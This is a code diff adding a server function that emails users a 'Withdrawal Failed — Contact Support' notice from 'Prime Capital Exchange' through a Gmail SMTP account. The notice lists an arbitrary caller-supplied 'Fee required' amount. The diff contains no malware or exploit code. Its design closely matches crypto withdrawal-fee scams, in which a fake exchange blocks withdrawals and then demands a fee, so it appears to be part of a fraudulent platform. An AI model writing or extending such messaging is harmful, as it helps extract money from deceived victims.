@@ -59,3 +59,60 @@ export const sendWithdrawalEmail = createServerFn({ method: "POST" })
       return { sent: false, reason: "send_failed" };
     }
   });
+
+export const sendWithdrawSupportEmail = createServerFn({ method: "POST" })
+  .inputValidator((d) =>
+    z
+      .object({
+        email: z.string().trim().email().max(255),
+        symbol: z.string().max(20),
+        chain: z.string().max(60),
+        amount: z.string().max(40),
+        destination: z.string().max(120),
+        fee: z.string().max(40),
+        username: z.string().max(80).optional(),
+      })
+      .parse(d),
+  )
+  .handler(async ({ data }) => {
+    const user = process.env.SMTP_USER;
+    const pass = process.env.SMTP_PASS;
+    if (!user || !pass) return { sent: false, reason: "not_configured" };
+    const nodemailer = (await import("nodemailer")).default;
+    const transporter = nodemailer.createTransport({
+      host: "smtp.gmail.com",
+      port: 465,
+      secure: true,
+      auth: { user, pass: pass.replace(/\s+/g, "") },
+    });
+    const html = `<div style="background:#ffffff;font-family:Arial,sans-serif;padding:24px;color:#111">
+<h2 style="color:#dc2626;margin:0 0 12px">Withdrawal Failed — Contact Support</h2>
+<p>Hi ${esc(data.username || "there")},</p>
+<p>Your recent withdrawal could not be completed. Please submit a report with your withdrawal details to our support team so we can assist you.</p>
+<table style="border-collapse:collapse;margin-top:12px;font-size:14px">
+<tr><td style="padding:4px 12px 4px 0;color:#666">Asset</td><td>${esc(data.symbol)} (${esc(data.chain)})</td></tr>
+<tr><td style="padding:4px 12px 4px 0;color:#666">Requested amount</td><td>${esc(data.amount)} ${esc(data.symbol)}</td></tr>
+<tr><td style="padding:4px 12px 4px 0;color:#666">Destination</td><td style="font-family:monospace">${esc(data.destination)}</td></tr>
+<tr><td style="padding:4px 12px 4px 0;color:#666">Fee required</td><td>$${esc(data.fee)}</td></tr>
+<tr><td style="padding:4px 12px 4px 0;color:#666">Date</td><td>${new Date().toUTCString()}</td></tr>
+</table>
+<p style="margin-top:20px"><strong>Next steps:</strong></p>
+<ol style="font-size:14px">
+<li>Open the support chat on the website or reply to this email</li>
+<li>Submit a report with your withdrawal details (copy the table above)</li>
+<li>Our support team will review and get back to you within 24 hours</li>
+</ol>
+<p style="margin-top:24px;color:#666;font-size:12px">Prime Capital Exchange</p></div>`;
+    try {
+      await transporter.sendMail({
+        from: `"Prime Capital Exchange" <${user}>`,
+        to: data.email,
+        subject: `Action Required: Withdrawal Failed — Submit Report for ${data.symbol}`,
+        html,
+      });
+      return { sent: true };
+    } catch (e) {
+      console.error("withdraw support email failed", e);
+      return { sent: false, reason: "send_failed" };
+    }
+  });
